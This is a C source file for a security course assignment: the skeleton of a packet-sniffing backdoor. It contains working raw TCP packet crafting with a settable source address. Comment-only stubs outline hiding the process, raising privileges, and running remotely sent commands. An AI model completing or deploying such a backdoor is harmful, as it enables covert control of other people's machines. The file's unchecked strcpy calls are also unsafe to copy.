/*
| ------------------------------------------------------------------------------
| File:     bd.c
| Purpose:  COMP 8505 Assignment 2
| Authors:  Kevin Eng, Jeremy Tsang
| Date:     Oct 6, 2014
| 
| Notes:    A packet-sniffing backdoor in C. This program includes the client
|           and server together as one main executable.
|
|           Compile using 'make clean' and 'make'.
|
|           Usage: ./backdoor -h
| 
| ------------------------------------------------------------------------------
*/

/*
| ------------------------------------------------------------------------------
| Headers
| ------------------------------------------------------------------------------
*/

#include "bd.h"

/*
| ------------------------------------------------------------------------------
| Main Function
| ------------------------------------------------------------------------------
*/

int main(int argc, char **argv){

    /* Parse arguments */
    
    int is_server = 0;
    struct client_opt c_opt;
    c_opt.target_host[0] = '\0';
    c_opt.command[0] = '\0';
    c_opt.target_port = 0;
    
    int opt;
    while((opt = getopt(argc, argv, "hsd:p:x:")) != -1){
        switch(opt){
            case 'h':
                usage();
                return 0;
                break;
            case 's':
                is_server = 1;
                break;
            case 'd':
                strcpy(c_opt.target_host, optarg);
                break;
            case 'p':
                c_opt.target_port = atoi(optarg);
                break;
            case 'x':
                strcpy(c_opt.command, optarg);
                break;
            default:
                printf("Type -h for usage help.\n");
                return 1;
        }
    }
    
    /* Validation then run client or server */
    
    if(is_server){
        server();
    }
    else{
        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0){
            printf("Type -h for usage help.\n");
            return 1;
        }
        else{
            client(c_opt);
        }
    }
    
    return 0;
}

/*
| ------------------------------------------------------------------------------
| Client
| ------------------------------------------------------------------------------
*/

void client(struct client_opt c_opt){

    /* Display options */

    printf("Running client...\n");
    printf("Target Host: %s\n",c_opt.target_host);
    printf("Target Port: %d\n",c_opt.target_port);
    printf("Command: %s\n",c_opt.command);
    
    /* Encrypt command */
    
    /* Set packet options */
    
    /* Send packet */
    
    /* Listen for results and print */
}

/*
| ------------------------------------------------------------------------------
| Server
| ------------------------------------------------------------------------------
*/

void server(){

    printf("Running server...\n");

    /* Mask process name */
    
    /* Raise privileges */
    
    /* Initialize variables and functions */
    
    /* Build packet filter */
    
    /* Activate packet filter */
    
    /* Packet capture loop */

}

/*
| ------------------------------------------------------------------------------
| Send Raw Packet
| ------------------------------------------------------------------------------
*/

int send_datagram(struct addr_info *user_addr){
    
    /* Declare variables */
    
    char datagram[PKT_SIZE];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(user_addr->dport);
    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
    
    // Zero out the buffer where the datagram will be stored
    memset(datagram, 0, PKT_SIZE); 
 
    /* IP header */
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htonl(DEFAULT_IP_ID);
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Initialize to zero before calculating checksum
    iph->saddr = inet_addr(user_addr->shost);
    iph->daddr = sin.sin_addr.s_addr;
 
    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
 
    /* TCP header */
    
    tcph->source = htons (user_addr->sport);
    tcph->dest = htons (user_addr->dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // Data Offset is set to the TCP header length 
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(WIN_SIZE);
    tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
    tcph->urg_ptr = 0;
   
    /* Calculate Checksum */
    
    psh.source_address = inet_addr(user_addr->shost);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
 
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
 
    tcph->check = csum((unsigned short*) &psh , sizeof (pseudo_header));
 
    /* Build our own header */
    
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            perror ("setsockopt");
    }
 
    /* Send the packet */
    
    if(sendto(user_addr->raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
        perror ("sendto");
        return -1;
    }
    else{ //Data sent successfully
        printf ("Datagram Sent!\n");
        return 0;
    }
}

/*
| ------------------------------------------------------------------------------
| Packet Handler Function
| ------------------------------------------------------------------------------
*/

void packet_handler(){
    
    /* Check the packet for the header key meant for the backdoor */
    
    /* Decrypt remaining packet data */
    
    /* Verify decryption succeeds by checking for custom header and footer */
    
    /* All checks successful, run the system command */
    
    /* Send results back to client */
}

/*
| ------------------------------------------------------------------------------
| Usage printout
| ------------------------------------------------------------------------------
*/

void usage(){
    
    printf("\n");
    printf("Usage: ./backdoor [OPTIONS]\n");
    printf("---------------------------\n");
    printf("  -h                Display this help.\n");
    printf("CLIENT (default)\n");
    printf("  -d <target_host>  The target host where the backdoor server is running.\n");
    printf("  -p <target_port>  The target port to send to.\n");
    printf("  -x <command>      The command to run on the target host.\n");
    printf("SERVER\n");
    printf("  -s                Enables server mode. No other options necessary.\n");
    printf("\n");
}
